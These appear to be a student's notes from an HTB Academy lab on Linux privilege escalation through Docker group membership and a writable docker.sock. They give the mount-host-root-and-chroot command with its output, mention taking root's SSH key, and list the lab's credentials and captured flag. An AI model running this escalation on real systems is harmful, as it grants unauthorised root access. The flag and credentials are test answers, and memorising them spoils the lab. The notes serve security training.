
## Privilege Escalation Methods
### Method 1: Docker Sockets

- A Docker socket or Docker daemon socket is a special file that allows us and processes to communicate with the Docker daemon
- Access to the Docker socket is typically restricted to specific users or user groups
- acts as a bridge, facilitating communication between the Docker client and the Docker daemon
- By exposing the Docker socket over a network interface, we can remotely manage Docker hosts, issue commands, and control containers and other resources

#### Map Host Directory to Docker Container Directory

Map the hosts root directory to the hosts directory on the container using the main_app docker image:
![[Pasted image 20240318110741.png]]

Logging in with the first Container ID listed and grabbing the private SSH key and log in as root
![[Pasted image 20240318110823.png]]


### Method 2: Docker Group

Verify if user is in the docker group. To gain root access the user must be in the docker group
```shell-session
docker-user@nix02:~$ id

uid=1000(docker-user) gid=1000(docker-user) groups=1000(docker-user),116(docker)
```

*OR*
- Docker must have SUID set
- User must be in the Sudoers file, which permits us to run `docker` as root
#### View images we can access
```
docker image ls
```

#### Method 3: Verify if the Docker Socket is writable

Usually located in `/var/run/docker.sock`. This file is supposed only allow write permissions for root. If it is writable, you may priv esc
```shell-session
docker-user@nix02:~$ docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash

root@ubuntu:~# ls -l

total 68
lrwxrwxrwx   1 root root     7 Apr 23  2020 bin -> usr/bin
drwxr-xr-x   4 root root  4096 Sep 22 11:34 boot
drwxr-xr-x   2 root root  4096 Oct  6  2021 cdrom
drwxr-xr-x  19 root root  3940 Oct 24 13:28 dev
drwxr-xr-x 100 root root  4096 Sep 22 13:27 etc
drwxr-xr-x   3 root root  4096 Sep 22 11:06 home
lrwxrwxrwx   1 root root     7 Apr 23  2020 lib -> usr/lib
lrwxrwxrwx   1 root root     9 Apr 23  2020 lib32 -> usr/lib32
lrwxrwxrwx   1 root root     9 Apr 23  2020 lib64 -> usr/lib64
lrwxrwxrwx   1 root root    10 Apr 23  2020 libx32 -> usr/libx32
drwx------   2 root root 16384 Oct  6  2021 lost+found
drwxr-xr-x   2 root root  4096 Oct 24 13:28 media
drwxr-xr-x   2 root root  4096 Apr 23  2020 mnt
drwxr-xr-x   2 root root  4096 Apr 23  2020 opt
dr-xr-xr-x 307 root root     0 Oct 24 13:28 proc
drwx------   6 root root  4096 Sep 26 21:11 root
drwxr-xr-x  28 root root   920 Oct 24 13:32 run
lrwxrwxrwx   1 root root     8 Apr 23  2020 sbin -> usr/sbin
drwxr-xr-x   7 root root  4096 Oct  7  2021 snap
drwxr-xr-x   2 root root  4096 Apr 23  2020 srv
dr-xr-xr-x  13 root root     0 Oct 24 13:28 sys
drwxrwxrwt  13 root root  4096 Oct 24 13:44 tmp
drwxr-xr-x  14 root root  4096 Sep 22 11:11 usr
drwxr-xr-x  13 root root  4096 Apr 23  2020 var
```


## Questions
### SSH
```
ssh htb-student@10.129.205.237
```

### Passwd
```
HTB_@cademy_stdnt!
```

#### Check file permissions for the socket file
![[Pasted image 20240318112824.png]]
SUID bit is set and we can access the 5a81c4b8502e image

I am also in the docker group
![[Pasted image 20240318114210.png]]


#### FLAG
With these two facts I was able to write to the docker.sock file and  priv esc to root. I then used the find command to find the flag
```
htb-student@ubuntu:/$ docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash
root@d48cd6caa0c0:/# 
root@d48cd6caa0c0:/# find /root -type f -name flag.txt -exec cat {} \; 2>dev/null
HTB{D0ck3r_Pr1vE5c}
root@d48cd6caa0c0:/# 
```